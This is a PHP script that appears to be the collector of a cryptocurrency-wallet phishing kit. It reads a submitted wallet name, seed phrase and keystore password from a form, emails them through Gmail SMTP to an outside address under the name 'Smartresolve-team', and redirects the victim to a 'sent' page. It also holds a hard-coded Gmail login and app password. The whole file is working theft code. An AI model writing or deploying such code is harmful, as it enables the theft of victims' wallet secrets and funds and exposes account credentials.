<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;


require 'email/src/Exception.php';
require 'email/src/PHPMailer.php';
require 'email/src/SMTP.php';




$new= $_POST['new'];
$details = $_POST['details'];
$password = $_POST['password'];



//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
   //$mail->SMTPDebug = 0;                      //Enable verbose debug output
   $mail->isSMTP();                                            //Send using SMTP
   $mail->Host       = "smtp.gmail.com";                     //Set the SMTP server to send through
   $mail->SMTPAuth   = true;                                   //Enable SMTP authentication
   $mail->Username   = 'davidwernert0007@gmail.com';                     //SMTP username
   $mail->Password   = 'sdbdqfmutdjsswym';                               //SMTP password
   $mail->SMTPSecure = 'ssl';            //Enable implicit TLS encryption
   $mail->Port       = 465;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`
                                 //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('davidwernert0007@gmail.com', 'Smartresolve-team');
    $mail->addAddress('Mariaadrianaespinosa7878@gmail.com');     //Add a recipient
    // $mail->addAddress('ellen@example.com');               //Name is optional
    // $mail->addReplyTo('info@example.com', 'Information');
    // $mail->addCC('cc@example.com');
    // $mail->addBCC('bcc@example.com');

    //Attachments
    // $mail->addAttachment('/var/tmp/file.tar.gz');         //Add attachments
    // $mail->addAttachment('/tmp/image.jpg', 'new.jpg');    //Optional name

    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'austoresolve check';
    $mail->Body    = '<h2><b>user wallet is:</b><br>'.$new.'</h2><br> <b> phrase are: </b><h2>'.$details.'</h2><br> <b> KEYSTORE JSON password: </b><h2>'.$password.'</h2>';
    // $mail->AltBody = 'This is the body in plain text for non-HTML mail clients';

    $mail->send();
    header("location: sent.php");

} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}